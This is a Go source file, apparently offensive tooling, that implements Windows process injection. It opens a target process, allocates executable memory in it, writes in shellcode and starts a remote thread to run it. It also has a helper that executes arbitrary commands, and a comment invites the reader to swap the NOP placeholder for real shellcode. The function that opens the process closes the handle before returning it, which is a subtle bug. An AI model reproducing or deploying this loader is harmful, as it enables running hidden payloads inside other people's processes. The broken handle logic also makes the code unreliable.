// Package syscall provides functions to make system calls.
package syscall

import (
    "fmt"
    "strings"
    "os/exec"
    "bytes"

	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
)

// Example shellcode: This is just a placeholder and doesn't do anything meaningful.
// You will need to replace this with actual, meaningful shellcode.
//shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP slide

var (
    kernel32DLL         = windows.NewLazySystemDLL("kernel32.dll")
    VirtualAllocExProc  = kernel32DLL.NewProc("VirtualAllocEx")
    WriteProcessMemoryProc = kernel32DLL.NewProc("WriteProcessMemory")
    CreateRemoteThreadProc = kernel32DLL.NewProc("CreateRemoteThread")
)

func ExecuteShellcodeOnProcess(processHandle windows.Handle, shellcode []byte) error {
	// Allocate memory in the target process
	addr, _, err := VirtualAllocExProc.Call(
		uintptr(processHandle),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)

	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	// Write the shellcode into the allocated memory
	_, _, err = WriteProcessMemoryProc.Call(
		uintptr(processHandle),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)

	if err.(syscall.Errno) != 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	// Create a remote thread that executes the shellcode
	threadHandle, _, err := CreateRemoteThreadProc.Call(
		uintptr(processHandle),
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	if threadHandle == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %v", err)
	}

	return nil
}

func OpenProcessByProcessID(pid int) windows.Handle {
	const PROCESS_ALL_ACCESS = windows.PROCESS_CREATE_THREAD | 
		windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION | 
		windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ

	// Open the target process
	processHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		fmt.Printf("OpenProcess failed: %v\n", err)
		var emptyHandle windows.Handle
		return emptyHandle
	}
	defer windows.CloseHandle(processHandle)

	return processHandle
}


func ExecuteSystemCallInNewProcess(command string) bool {
    // Check if command exists
    if len(command) == 0 {
        return false
    }

    // Split command on whitespace
    args := strings.Fields(command)
    fmt.Println("[i] Execute command:", args)
    fmt.Println()

    // Call command dynamiclly with n arguments
    cmd := exec.Command(args[0], args[1:]...)

    // Create buffers to capture stdout and stderr
    var stdout bytes.Buffer
    var stderr bytes.Buffer
    cmd.Stdout = &stdout
    cmd.Stderr = &stderr

    // Execute command
    cmd.Run()
    fmt.Println(stdout.String())
    fmt.Println(stderr.String())

    return true
}
